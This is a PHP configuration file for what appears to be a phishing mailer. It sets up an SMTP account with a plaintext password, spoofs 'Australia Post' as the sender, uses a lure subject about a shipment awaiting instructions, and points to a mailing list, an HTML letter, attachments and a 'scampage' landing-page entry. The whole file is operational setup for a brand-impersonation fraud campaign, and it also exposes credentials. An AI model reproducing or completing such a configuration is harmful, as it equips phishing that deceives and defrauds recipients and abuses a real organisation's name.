<?php
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');
$smtp_acc = [
[
	"host" => "mail.postbank.pro",
	"port" => "25",
	"smtp_secure" => "false",//or false
	"username" => "admin",
	"password" => "fHzuGBoq1Dn0bLlFbUDGr1LL"
],
];
$Set_vix =[
	"priority" => 1, "userandom" => 0, 
	"sleeptime" => 1, "replacement" => 1, 
	"filesend" => 1, "userremoveline" => 0, 
	"mail_list" => "vix/vix_files/mails/list.txt", 
	"fromname" => "Australia Post", 
	"frommail" => "admin@postbank.pro",
	"subject" => "Your shipment is still waiting for instructions from you.", 
	"msgfile" => "vix/vix_files/letters/au.html", "filepdf" => 
	"vix/vix_files/attachment/", 
	"scampage" => ["http://google.com"], 
];
